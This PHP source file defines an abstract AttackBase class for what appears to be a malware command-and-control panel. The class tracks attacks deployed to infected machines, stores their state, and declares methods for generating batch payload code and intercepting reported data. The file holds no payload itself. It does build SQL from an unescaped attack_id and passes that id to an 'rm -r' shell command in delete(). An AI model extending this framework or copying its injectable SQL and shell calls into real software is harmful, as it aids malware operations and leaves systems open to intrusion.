<?php /** @noinspection PhpIncludeInspection */

namespace Kelvinho\Virus\Attack;

use Kelvinho\Virus\Network\RequestData;
use Kelvinho\Virus\Session\Session;
use Kelvinho\Virus\User\UserFactory;
use Kelvinho\Virus\Virus\VirusFactory;
use function Kelvinho\Virus\db;

/**
 * Abstract class AttackBase. All attacks should subclass this.
 *
 * Represents an attack. The representation of this will be stored in table attacks, and the data stored on disk is at:
 * DATA_FILE/attacks/{attack_id}/
 *
 * Currently, these are stored on disk:
 * - Profile text, at /profile.txt
 * - Additional info, at /state.json, utilized by subclasses
 *
 * @package Kelvinho\Virus\Attack
 * @author Quang Ho <157239q@gmail.com>
 * @copyright Copyright (c) 2020 Quang Ho <https://github.com/157239n>
 * @license http://www.opensource.org/licenses/mit-license.html  MIT License
 */
abstract class AttackBase {
    public const STATUS_DORMANT = "Dormant";
    public const STATUS_EXECUTED = "Executed";
    public const STATUS_DEPLOYED = "Deployed";
    public const STATUSES = [self::STATUS_DORMANT, self::STATUS_DEPLOYED, self::STATUS_EXECUTED];
    protected string $attack_id;
    protected string $packageDbName; // this is read-only. After an attack is initialized, you can't change its package.
    protected string $status = self::STATUS_DORMANT;
    protected string $virus_id;
    protected string $name = "";
    protected string $profile = "";
    protected int $executed_time = 0;
    protected RequestData $requestData;
    protected Session $session;
    protected VirusFactory $virusFactory;
    protected AttackFactory $attackFactory;
    protected UserFactory $userFactory;

    function __construct() {
    }

    function setContext(RequestData $requestData, Session $session, UserFactory $userFactory, VirusFactory $virusFactory, AttackFactory $attackFactory) {
        $this->requestData = $requestData;
        $this->session = $session;
        $this->userFactory = $userFactory;
        $this->virusFactory = $virusFactory;
        $this->attackFactory = $attackFactory;
    }

    function setAttackId(string $attack_id): void {
        $this->attack_id = $attack_id;
    }

    public function getAttackId(): string {
        return $this->attack_id;
    }

    public function setStatus(string $status): void {
        $this->status = $status;
    }

    public function getStatus(): string {
        return $this->status;
    }

    public function isStatus(string $status): bool {
        return $status == $this->status;
    }

    public function setName(string $name): void {
        $this->name = $name;
    }

    public function getName(): string {
        return $this->name;
    }

    public function setProfile(string $profile): void {
        $this->profile = $profile;
    }

    public function getProfile(): string {
        return $this->profile;
    }

    function setPackageDbName(string $packageDbName): void {
        $this->packageDbName = $packageDbName;
    }

    public function getPackageDbName(): string {
        return $this->packageDbName;
    }

    function setVirusId(string $virus_id): void {
        $this->virus_id = $virus_id;
    }

    public function getVirusId(): string {
        return $this->virus_id;
    }

    /**
     * This will generate the intercept code that will be used to take the reported data back from the virus. TODO: delete this
     */
    public function generateIntercept(): string {
        return "";
    }

    /**
     * This will restore the state of an attack with all of its configuration using a json string.
     *
     * @param string $json The JSON string
     */
    abstract protected function setState(string $json): void;

    /**
     * This will load the state of this attack using the file /data/attacks/{attack_id}/state.json
     * Also loads the profile.
     *
     * @internal Should only be used by AttackFactory
     */
    public function loadFromDisk(): void {
        $this->setState(file_get_contents(DATA_FILE . "/attacks/$this->attack_id/state.json"));
        $this->setProfile(file_get_contents(DATA_FILE . "/attacks/$this->attack_id/profile.txt"));
    }

    /**
     * This will get the state of an attack as a json string.
     *
     * @return string The JSON string
     */
    abstract protected function getState(): string;

    /**
     * This will save the state of everything about this attack.
     */
    public function saveState(): void {
        file_put_contents(DATA_FILE . "/attacks/$this->attack_id/state.json", $this->getState());
        file_put_contents(DATA_FILE . "/attacks/$this->attack_id/profile.txt", $this->getProfile());
        $mysqli = db();
        $mysqli->query("update attacks set status = \"$this->status\", name = \"" . $mysqli->escape_string($this->name) . "\", status = \"$this->status\", executed_time = $this->executed_time where attack_id = \"$this->attack_id\"");
        $mysqli->close();
    }

    /**
     * This should generate the actual batch code to be run as payload.
     * Expected (but not required) to call BaseScript::payloadConfirmationLoop() to generate the appropriate payload confirmation loop.
     *
     * @return string
     */
    abstract public function generateBatchCode(): string;

    /**
     * This will include some extra resources that the attack might need. Things like other scripts and configs.
     *
     * @param string $resourceIdentifier The resource name
     */
    abstract public function processExtras(string $resourceIdentifier): void;

    public function render(): void {
        AttackRenderer::render($this, $this->session, $this->userFactory);
    }

    /**
     * This will include the correct controller page for this particular attack type.
     */
    public function includeController(): void {
        include(PackageRegistrar::getLocation($this->packageDbName) . "/controller.php");
    }

    /**
     * This will include the correct intercept script
     */
    public function includeIntercept(): void {
        include(PackageRegistrar::getLocation($this->packageDbName) . "/intercept.php");
    }

    /**
     * Deploys the attack.
     */
    public function deploy(): void {
        $this->status = self::STATUS_DEPLOYED;
    }

    /**
     * Cancels the attack.
     */
    public function cancel(): void {
        $this->status = self::STATUS_DORMANT;
    }

    /**
     * Sets this attack to be executed.
     */
    public function setExecuted(): void {
        $this->status = self::STATUS_EXECUTED;
        $this->executed_time = time();
    }

    /**
     * Return the executed time. Is 0 if this attack has not been executed.
     *
     * @return int The unix timestamp
     */
    public function getExecutedTime(): int {
        return $this->executed_time;
    }

    /**
     * Sets the executed time.
     *
     * @param int $executedTime
     * @internal Should only be used by AttackFactory
     */
    public function setExecutedTime(int $executedTime): void {
        $this->executed_time = $executedTime;
    }

    /**
     * Deletes the attack permanently.
     */
    public function delete(): void {
        $mysqli = db();
        $mysqli->query("delete from attacks where attack_id = \"$this->attack_id\"");
        $mysqli->close();
        exec("rm -r " . DATA_FILE . "/attacks/$this->attack_id");
    }

    /**
     * Checks whether an attack id exists or not.
     *
     * @param string $attack_id The attack id
     * @return bool Whether it exists or not
     */
    public static function exists(string $attack_id): bool {
        $mysqli = db();
        $answer = $mysqli->query("select attack_id from attacks where attack_id = \"" . $mysqli->escape_string($attack_id) . "\"");
        $mysqli->close();
        if ($answer) {
            $row = $answer->fetch_assoc();
            if ($row) {
                return true;
            }
        }
        return false;
    }
}